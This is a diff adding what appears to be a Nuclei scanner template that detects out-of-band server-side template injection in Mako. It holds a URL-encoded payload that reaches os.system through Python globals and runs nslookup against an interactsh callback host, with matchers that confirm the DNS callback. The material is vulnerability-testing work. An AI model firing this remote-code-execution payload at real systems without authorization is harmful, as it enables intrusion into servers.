@@ -1,0 +1,40 @@
+id: mako-oob
+
+info:
+  name: Mako - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: unknown
+  reference:
+    - https://www.makotemplates.org/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "%24%7Bself.__init__.__globals__%5B%27util%27%5D.os.system%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    skip-variables-check: true
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4b0a00483046022100e6ac062ed9c0e9fa784c8296f025b27d4d207bd3ab5d48a825b5bc9cf11832db022100b3a95dfaf53649599c28f306e1bf8ceec91fb6be97e3ad5398f00732efaa0fd0:922c64590222798bb761d5b6d8e72950
